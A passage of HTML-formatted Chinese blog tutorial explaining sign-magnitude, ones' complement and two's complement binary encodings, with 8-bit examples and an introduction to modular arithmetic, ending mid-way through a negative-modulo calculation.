padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n本篇文章讲解了计算机的原码, 反码和补码. 并且进行了深入探求了为何要使用反码和补码, 以及更进一步的论证了为何可以用反码, 补码的加法计算原码的减法. 论证部分如有不对的地方请各位牛人帮忙指正! 希望本文对大家学习计算机基础有所帮助!</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n&nbsp;</p>\r\n<h2 style=\"margin:10px 0px; padding:0px; color:rgb(255,0,0); line-height:1.8; font-size:21px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n一. 机器数和真&#20540;</h2>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n在学习原码, 反码和补码之前, 需要先了解机器数和真&#20540;的概念.</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n1、机器数</h3>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n一个数在计算机中的二进制表示形式,&nbsp; 叫做这个数的机器数。机器数是带符号的，在计算机用一个数的最高位存放符号, 正数为0, 负数为1.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n比如，十进制中的数 &#43;3 ，计算机字长为8位，转换成二进制就是00000011。如果是 -3 ，就是 10000011 。</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n那么，这里的 00000011 和 10000011 就是机器数。</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n2、真&#20540;</h3>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n因为第一位是符号位，所以机器数的形式&#20540;就不等于真正的数&#20540;。例如上面的有符号数 10000011，其最高位1代表负，其真正数&#20540;是 -3 而不是形式&#20540;131（10000011转换成十进制等于131）。所以，为区别起见，将带符号位的机器数对应的真正数&#20540;称为机器数的真&#20540;。</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n例：0000 0001的真&#20540; = &#43;000 0001 = &#43;1，1000 0001的真&#20540; = –000 0001 = –1</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n&nbsp;</p>\r\n<h2 style=\"margin:10px 0px; padding:0px; color:rgb(255,0,0); line-height:1.8; font-size:21px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n二. 原码, 反码, 补码的基础概念和计算方法.</h2>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n在探求为何机器要使用补码之前, 让我们先了解原码, 反码和补码的概念.对于一个数, 计算机要使用一定的编码方式进行存储. 原码, 反码, 补码是机器存储一个具体数字的编码方式.</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n1. 原码</h3>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n原码就是符号位加上真&#20540;的绝对&#20540;, 即用第一位表示符号, 其余位表示&#20540;. 比如如果是8位二进制:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[&#43;1]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= 0000 0001</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[-1]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= 1000 0001</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n第一位是符号位. 因为第一位是符号位, 所以8位二进制数的取&#20540;范围就是:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[1111 1111 , 0111 1111]</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n即</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[-127 , 127]</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n原码是人脑最容易理解和计算的表示方式.</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n2. 反码</h3>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n反码的表示方法是:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n正数的反码是其本身</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n负数的反码是在其原码的基础上, 符号位不变，其余各个位取反.</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[&#43;1] = [00000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [00000001]<sub style=\"margin:0px; padding:0px\">反</sub></p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[-1] = [10000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [11111110]<sub style=\"margin:0px; padding:0px\">反</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n可见如果一个反码表示的是负数, 人脑无法直观的看出来它的数&#20540;. 通常要将其转换成原码再计算.</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n3. 补码</h3>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n补码的表示方法是:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n正数的补码就是其本身</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n负数的补码是在其原码的基础上, 符号位不变, 其余各位取反, 最后&#43;1. (即在反码的基础上&#43;1)</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[&#43;1] = [00000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [00000001]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;= [00000001]<sub style=\"margin:0px; padding:0px\">补</sub></p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[-1] = [10000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [11111110]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;= [11111111]<sub style=\"margin:0px; padding:0px\">补</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n对于负数, 补码表示方式也是人脑无法直观看出其数&#20540;的. 通常也需要转换成原码在计算其数&#20540;.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n&nbsp;</p>\r\n<h2 style=\"margin:10px 0px; padding:0px; color:rgb(255,0,0); line-height:1.8; font-size:21px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n三. 为何要使用原码, 反码和补码</h2>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n在开始深入学习前, 我的学习建议是先&quot;死记硬背&quot;上面的原码, 反码和补码的表示方式以及计算方法.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n现在我们知道了计算机可以有三种编码方式表示一个数. 对于正数因为三种编码方式的结果都相同:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[&#43;1] = [00000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [00000001]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;= [00000001]<sub style=\"margin:0px; padding:0px\">补</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n所以不需要过多解释. 但是对于负数:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[-1] = [10000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [11111110]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;= [11111111]<sub style=\"margin:0px; padding:0px\">补</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n可见原码, 反码和补码是完全不同的. 既然原码才是被人脑直接识别并用于计算表示方式, 为何还会有反码和补码呢?</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n首先, 因为人脑可以知道第一位是符号位, 在计算的时候我们会根据符号位, 选择对真&#20540;区域的加减. (真&#20540;的概念在本文最开头). 但是对于计算机, 加减乘数已经是最基础的运算, 要设计的尽量简单. 计算机辨别&quot;符号位&quot;显然会让计算机的基础电路设计变得十分复杂! 于是人们想出了将符号位也参与运算的方法. 我们知道, 根据运算法则减去一个正数等于加上一个负数, 即: 1-1 = 1 &#43; (-1) = 0 , 所以机器可以只有加法而没有减法, 这样计算机运算的设计就更简单了.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n于是人们开始探索 将符号位参与运算, 并且只保留加法的方法. 首先来看原码:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n计算十进制的表达式: 1-1=0</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n1 - 1 = 1 &#43; (-1) = [00000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;&#43; [10000001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [10000010]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= -2</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n如果用原码表示, 让符号位也参与计算, 显然对于减法来说, 结果是不正确的.这也就是为何计算机内部不使用原码表示一个数.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n为了解决原码做减法的问题, 出现了反码:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n计算十进制的表达式: 1-1=0</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n1 - 1 = 1 &#43; (-1) = [0000 0001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;&#43; [1000 0001]<sub style=\"margin:0px; padding:0px\">原</sub>= [0000 0001]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;&#43; [1111 1110]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;= [1111 1111]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;=\r\n [1000 0000]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= -0</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n发现用反码计算减法, 结果的真&#20540;部分是正确的. 而唯一的问题其实就出现在&quot;0&quot;这个特殊的数&#20540;上. 虽然人们理解上&#43;0和-0是一样的, 但是0带符号是没有任何意义的. 而且会有[0000 0000]<sub style=\"margin:0px; padding:0px\">原</sub>和[1000 0000]<sub style=\"margin:0px; padding:0px\">原</sub>两个编码表示0.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n于是补码的出现, 解决了0的符号以及两个编码的问题:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n1-1 = 1 &#43; (-1) = [0000 0001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;&#43; [1000 0001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [0000 0001]<sub style=\"margin:0px; padding:0px\">补</sub>&nbsp;&#43; [1111 1111]<sub style=\"margin:0px; padding:0px\">补</sub>&nbsp;= [0000 0000]<sub style=\"margin:0px; padding:0px\">补</sub>=[0000\r\n 0000]<sub style=\"margin:0px; padding:0px\">原</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n这样0用[0000 0000]表示, 而以前出现问题的-0则不存在了.而且可以用[1000 0000]表示-128:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-1) &#43; (-127) = [1000 0001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;&#43; [1111 1111]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [1111 1111]<sub style=\"margin:0px; padding:0px\">补</sub>&nbsp;&#43; [1000 0001]<sub style=\"margin:0px; padding:0px\">补</sub>&nbsp;= [1000 0000]<sub style=\"margin:0px; padding:0px\">补</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n-1-127的结果应该是-128, 在用补码运算的结果中, [1000 0000]<sub style=\"margin:0px; padding:0px\">补</sub>&nbsp;就是-128. 但是注意因为实际上是使用以前的-0的补码来表示-128, 所以-128并没有原码和反码表示.(对-128的补码表示[1000 0000]补算出来的原码是[0000 0000]<sub style=\"margin:0px; padding:0px\">原</sub>, 这是不正确的)</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n使用补码, 不仅仅修复了0的符号以及存在两个编码的问题, 而且还能够多表示一个最低数. 这就是为什么8位二进制, 使用原码或反码表示的范围为[-127, &#43;127], 而使用补码表示的范围为[-128, 127].</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n因为机器使用补码, 所以对于编程中常用到的32位int类型, 可以表示范围是: [-2<sup style=\"margin:0px; padding:0px\">31</sup>, 2<sup style=\"margin:0px; padding:0px\">31</sup>-1] 因为第一位表示的是符号位.而使用补码表示时又可以多保存一个最小&#20540;.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n&nbsp;</p>\r\n<h2 style=\"margin:10px 0px; padding:0px; color:rgb(255,0,0); line-height:1.8; font-size:21px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n四 原码, 反码, 补码 再深入</h2>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n计算机巧妙地把符号位参与运算, 并且将减法变成了加法, 背后蕴含了怎样的数学原理呢?</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n将钟表想象成是一个1位的12进制数. 如果当前时间是6点, 我希望将时间设置成4点, 需要怎么做呢?我们可以:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n1. 往回拨2个小时: 6 - 2 = 4</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n2. 往前拨10个小时: (6 &#43; 10) mod 12 = 4</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n3. 往前拨10&#43;12=22个小时: (6&#43;22) mod 12 =4</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n2,3方法中的mod是指取模操作, 16 mod 12 =4 即用16除以12后的余数是4.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n所以钟表往回拨(减法)的结果可以用往前拨(加法)替代!</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n现在的焦点就落在了如何用一个正数, 来替代一个负数. 上面的例子我们能感觉出来一些端倪, 发现一些规律. 但是数学是严谨的. 不能靠感觉.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n首先介绍一个数学中相关的概念: 同余</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n&nbsp;</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n同余的概念</h3>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n两个整数a，b，若它们除以整数m所得的余数相等，则称a，b对于模m同余</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n记作 a ≡ b (mod m)</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n读作 a 与 b 关于模 m 同余。</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n举例说明:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n4 mod 12 = 4</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n16 mod 12 = 4</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n28 mod 12 = 4</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n所以4, 16, 28关于模 12 同余.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n&nbsp;</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n负数取模</h3>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n正数进行mod运算是很简单的. 但是负数呢?</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n下面是关于mod运算的数学定义:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<a target=\"_blank\" href=\"http://images.cnblogs.com/cnblogs_com/zhangziqiu/201103/201103302155507894.jpg\" style=\"margin:0px; padding:0px; text-decoration:none; color:rgb(0,0,0); border-bottom-width:1px; border-bottom-style:dotted; border-bottom-color:rgb(51,51,51)\"><img title=\"clip_image001\" height=\"34\" alt=\"clip_image001\" src=\"http://images.cnblogs.com/cnblogs_com/zhangziqiu/201103/201103302155504514.jpg\" width=\"244\" border=\"0\" style=\"margin:0px; padding:0px; border:0px none; display:inline\"></a></p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n上面是截图, &quot;取下界&quot;符号找不到如何输入(word中粘贴过来后乱码). 下面是使用&quot;L&quot;和&quot;J&quot;替换上图的&quot;取下界&quot;符号:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\nx mod y = x - y L x / y J</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n上面公式的意思是:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\nx mod y等于 x 减去 y 乘上 x与y的商的下界.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n以 -3 mod 2 举例:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n-3 mod 2</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n= -3 - 2xL -3/2 J</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n= -3 - 2xL-1.5J</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n= -3 - 